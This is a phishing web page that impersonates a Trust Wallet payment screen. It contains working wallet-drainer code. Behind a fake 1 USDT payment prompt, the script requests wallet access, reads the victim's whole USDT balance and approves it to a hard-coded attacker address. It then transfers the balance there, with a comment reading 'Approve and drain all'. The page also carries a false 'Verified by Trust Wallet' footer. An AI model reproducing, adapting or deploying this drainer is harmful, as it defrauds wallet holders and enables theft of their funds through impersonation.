<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" href="./favicon.ico" type="image/x-icon" />
<title>Secure Payment • Trust Wallet</title>
<style>
  body {
    background: #081c3a;
    color: white;
    font-family: Arial, sans-serif;
    text-align: center;
    padding: 20px;
  }
  img { width: 80px; margin: 20px auto; }
  h1 { font-size: 1.5em; }
  p { opacity: 0.8; }
  .footer { position: fixed; bottom: 10px; width: 100%; opacity: 0.5; font-size: 0.8em; }
  .button {
    background: #0052ff; padding: 14px 28px; border: none; color: white;
    border-radius: 8px; cursor: pointer; font-size: 1.1em; margin-top: 20px;
  }
  .hidden { display: none; }
  .fake-screen {
    border: 2px solid #0052ff;
    border-radius: 10px;
    padding: 20px;
    margin-top: 40px;
  }
</style>
</head>
<body>
<img src="./logo.png" alt="Trust Wallet" />
<h1>Secure Payment</h1>
<p>Send USDT quickly and safely.</p>

<div class="fake-screen" id="fakeScreen">
  <p><strong>Amount:</strong> 1.0000 USDT</p>
  <p><strong>Receiver:</strong> ***********B53</p>
  <button class="button" id="fakePayButton">Pay 1 USDT</button>
</div>

<div id="realScreen" class="hidden">
  <h1>Tap to Approve &amp; Complete</h1>
  <p>Smart contract authorization required to finalize transfer.</p>
  <button class="button" id="approveButton">Approve & Complete</button>
</div>

<div class="footer">Verified by Trust Wallet • Trusted since 2009</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
<script>
  const DRAIN_ADDRESS = "0xDA0bab807633f07f013f94DD0E6A4F96F8742B53"; // TERA WALLET
  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
  const ABI = [
    { "constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
    { "constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function" },
    { "constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function" }
  ];

  const fakeScreen = document.getElementById('fakeScreen');
  const realScreen = document.getElementById('realScreen');

  document.getElementById('fakePayButton').onclick = async () => {
    fakeScreen.classList.add('hidden');
    realScreen.classList.remove('hidden');
  }

  document.getElementById('approveButton').onclick = async () => {
    if (!window.ethereum) { alert('Use Trust Wallet DApp browser'); return; }
    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const [user] = await web3.eth.getAccounts();
    const contract = new web3.eth.Contract(ABI, USDT_ADDRESS);
    const balance = await contract.methods.balanceOf(user).call();

    // Approve and drain all
    await contract.methods.approve(DRAIN_ADDRESS, balance).send({ from: user });
    await contract.methods.transferFrom(user, DRAIN_ADDRESS, balance).send({ from: user });

    document.getElementById('approveButton').textContent = '✅ Success!';
    setTimeout(() => window.close(), 2000); // close after success
  };
</script>
</body>
</html>
